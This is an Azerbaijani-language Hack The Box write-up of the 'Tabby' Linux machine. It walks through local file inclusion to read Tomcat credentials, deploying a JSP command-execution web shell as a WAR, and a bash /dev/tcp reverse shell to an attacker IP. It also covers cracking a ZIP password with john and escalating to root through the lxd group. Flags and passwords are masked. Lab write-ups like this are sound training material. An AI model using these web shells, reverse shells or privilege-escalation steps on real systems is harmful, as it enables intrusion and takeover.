# Tabby (HTB)

> Platforma: Hack The Box  
> OS: Linux  
> Çətinlik: Asan  
> Nəticə: root

---

## Hücum Zənciri

```text
Reconnaissance
├── nmap -p- --min-rate=5000 -T4 → 22 (SSH), 80 (Apache "Mega Hosting"), 8080 (Tomcat)
└── /etc/hosts: 10.129.77.170 tabby.htb megahosting.htb

Foothold (LFI → Tomcat creds)
├── news.php?file=statement → LFI
├── ../../../../etc/passwd → ash (uid 1000)
├── ../../../../usr/share/tomcat9/etc/tomcat-users.xml
└── tomcat:<PASSWORD> (admin-gui,manager-script)

Exploitation (WAR deploy)
├── /manager/html → 401 (manager-gui yoxdur)
├── /manager/text/list → OK (manager-script işləyir)
├── jar -cvf cmd.war cmd.jsp
├── curl -T cmd.war ".../manager/text/deploy?path=/cmd&update=true"
└── shell as tomcat (uid 997)

Lateral Movement (ZIP crack)
├── /var/www/html/files/16162020_backup.zip
├── zip2john → john → <PASSWORD>
├── su ash → <PASSWORD>
└── cat /home/ash/user.txt → <USER_FLAG>

Privilege Escalation (LXD)
├── id → groups=...,116(lxd)
├── lxc storage create default dir
├── lxc profile device add default root disk path=/ pool=default
├── lxc image import /home/ash/alpine.tar.gz --alias alpine
├── lxc init alpine privesc -c security.privileged=true
├── lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
├── lxc start privesc && lxc exec privesc /bin/sh
└── cat /mnt/root/root/root.txt → <ROOT_FLAG>
```

> Qeyd: Bütün flaglar, parollar və heşlər etik səbəblərə görə maskalanmışdır.

---

## Maşın Brifinqi

Ubuntu 20.04 üzərində Apache 2.4.41 (Mega Hosting) və Tomcat 9.0.31. İkinci vhost `megahosting.htb` LFI-yə həssasdır, bu `tomcat-users.xml`-i oxumağa və Tomcat-ın `manager/text` interfeysinə giriş əldə etməyə imkan verir. WAR faylının deploy edilməsi `tomcat` istifadəçisindən shell verir. Daha sonra parolla qorunan ZIP arxivi `ash` istifadəçisinin parolunu açır, `lxd` qrupu isə privileged konteyner vasitəsilə root imtiyazlarını verir.

---

## Kəşfiyyat

### Port Skanı

```bash
nmap -p- --min-rate=5000 --max-retries 1 --defeat-rst-ratelimit -T4 -Pn -n tabby.htb -oA scans/quick
nmap -sC -sV -Pn -n --open -p 22,80,8080 tabby.htb -oA scans/detail
```

| Port | Xidmət | Versiya                              |
|------|--------|--------------------------------------|
| 22   | SSH    | OpenSSH 8.2p1 Ubuntu 4               |
| 80   | HTTP   | Apache httpd 2.4.41 (Ubuntu)         |
| 8080 | HTTP   | Apache Tomcat                        |

```bash
echo "10.129.77.170    tabby.htb megahosting.htb" | sudo tee -a /etc/hosts
```

### Vhost Kəşfiyyatı

Ana səhifədəki HTML-də xarici link diqqəti çəkir:

```html
<li><a href="http://megahosting.htb/news.php?file=statement">News</a></li>
```

Yəni eyni serverdə ikinci vhost `megahosting.htb` var və `news.php` `file` parametri qəbul edir.

---

## Foothold (LFI → Tomcat creds)

### LFI-nin təsdiqlənməsi

```bash
curl -s "http://megahosting.htb/news.php?file=../../../../etc/passwd"
```

Çıxışda `ash:x:1000:1000:clive:/home/ash:/bin/bash` sətri görünür.

### Tomcat konfiqurasiyasının oxunması

Ubuntu-da `tomcat9` paketinin konfiqurasiyası `/usr/share/tomcat9/etc/` altındadır:

```bash
curl -s "http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml"
```

**Nəticə:**

```xml
<role rolename="admin-gui"/>
<role rolename="manager-script"/>
<user username="tomcat" password="<PASSWORD>" roles="admin-gui,manager-script"/>
```

**Əsas məqam:** istifadəçi `tomcat` yalnız `admin-gui` və `manager-script` rollarına malikdir. `manager-gui` rolu yoxdur, buna görə `/manager/html` 401 qaytarır. Amma `manager-script` `/manager/text` interfeysinə giriş verir.

---

## Exploitation (WAR deploy)

### Girişin yoxlanılması

```bash
curl -s -u 'tomcat:<PASSWORD>' http://tabby.htb:8080/manager/text/list
```

**Nəticə:**

```
OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/examples:running:0:/usr/share/tomcat9-examples/examples
/host-manager:running:0:/usr/share/tomcat9-admin/host-manager
/manager:running:0:/usr/share/tomcat9-admin/manager
/docs:running:0:/usr/share/tomcat9-docs/docs
```

### WAR faylının hazırlanması

```bash
mkdir -p /tmp/tabby-war
cat > /tmp/tabby-war/cmd.jsp <<'EOF'
<%@ page import="java.util.*,java.io.*"%>
<%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) out.println(line);
  }
%>
EOF

cd /tmp/tabby-war
jar -cvf /tmp/cmd.war cmd.jsp
```

### Deploy və reverse shell

```bash
nc -lvnp 4444

curl -u 'tomcat:<PASSWORD>' \
  --upload-file /tmp/cmd.war \
  "http://tabby.htb:8080/manager/text/deploy?path=/cmd&update=true"
# OK - Deployed application at context path [/cmd]
```

JSP-ni `curl --data-urlencode` ilə çağırırıq ki, Tomcat 9-un sərt request-target yoxlaması problem yaratmasın:

```bash
curl -s -G "http://tabby.htb:8080/cmd/cmd.jsp" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.82/4444 0>&1'"
```

**Shell `tomcat` istifadəçisindən (uid 997).**

### Sabitləşdirmə

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Lateral Movement (ZIP crack)

### Arxivin tapılması

```bash
ls -la /var/www/html/files/
```

**Nəticə:**

```
-rw-r--r-- 1 ash  ash  8716 Jun 16  2020 16162020_backup.zip
```

### Yükləmə və parolun sındırılması

```bash
# Kali-də
wget http://megahosting.htb/files/16162020_backup.zip -O backup.zip
zip2john backup.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
# <PASSWORD>
```

### Keçid

```bash
su ash
# password: <PASSWORD>
cat /home/ash/user.txt
# <USER_FLAG>
```

---

## Privilege Escalation (LXD)

### Enumeration

```bash
id
```

**Nəticə:**

```
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

`lxd` qrupu privileged konteyner yaratmağa və host-un fayl sistemini ona mount etməyə imkan verir.

### Alpine obrazının hazırlanması (Kali-də)

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
python3 -m http.server 8000
```

### Obrazın yüklənməsi və LXD-nin işə salınması

```bash
# Hədəfdə, ash altında
cd /home/ash
wget http://10.10.14.82:8000/alpine-v3.24-x86_64-*.tar.gz -O alpine.tar.gz

export PATH=$PATH:/snap/bin
lxc image import /home/ash/alpine.tar.gz --alias alpine

lxc storage create default dir
lxc profile device add default root disk path=/ pool=default

lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
```

**Vacib nüans:** snap-versiyası LXD `/tmp`-i görmür - ona görə obrazı `/home/ash/`-ə köçürmək lazımdır. Həmçinin LXD `storage pool` olmadan `lxc init` xəta verir - `lxc storage create default dir` və profilin düzəldilməsi tələb olunur.

### Root flag

```bash
lxc exec privesc /bin/sh
# Konteyner daxilində:
cd /mnt/root/root
cat root.txt
# <ROOT_FLAG>
```

---

## Bayraqlar

| Bayraq | Dəyər                            |
|--------|----------------------------------|
| User   | <USER_FLAG> |
| Root   | <ROOT_FLAG> |

---

## Əsas Nəticələr

- **İkinci vhost-u aşkar etmək** - əsas saytda xarici link kifayət edir; həmişə HTML-i diqqətlə oxumaq lazımdır.
- **LFI + konfiqurasiya faylı** - `tomcat-users.xml` kredləri açıq mətnlə saxlayır; Ubuntu paketində yol `/usr/share/tomcat9/etc/`-dir.
- **`manager-script` rolu `manager-gui`-ni əvəz edir** - GUI 401 qaytarır, amma `manager/text` deploy üçün kifayətdir.
- **`curl --data-urlencode`** - Tomcat 9 sərt request-target yoxlaması olduğu üçün JSP-yə parametrləri bu üsulla ötürmək lazımdır.
- **Parol təkrar istifadəsi** - ZIP arxivinin parolu `ash` istifadəçisinin parolu ilə eynidir.
- **LXD privileged konteyner** - `lxd` qrupu praktiki olaraq root-a bərabərdir; `security.privileged=true` + `source=/` kifayətdir.
- **Snap LXD `/tmp`-i görmür** - obrazı ev qovluğuna köçürmək lazımdır. Həmçinin `lxc init`-dən əvvəl `storage pool` yaratmaq tələb olunur.